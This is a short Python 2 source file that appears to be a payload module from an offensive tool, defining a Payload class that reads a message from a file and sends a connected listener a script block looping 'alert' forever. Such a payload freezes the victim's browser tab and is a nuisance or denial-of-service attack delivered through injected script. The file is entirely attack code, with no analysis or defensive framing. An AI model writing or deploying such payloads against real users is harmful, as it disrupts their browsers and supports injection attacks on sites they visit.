class Payload (object):
    def __init__(self, listener):
        self.listener = listener
        self.message = ''

        with open ('payloads/notbad/alert/message', 'r') as f:
            for i in f.readlines ():
                self.message += i
        f.close ()

    def run (self):

        from core.design.colors import YES

        DATA = '''
        <script>
            while (true) {
                alert ("''' + self.message + '''");
            }
        </script>
        '''

        self.listener.send_data (DATA)
        print YES + 'Data was sent'
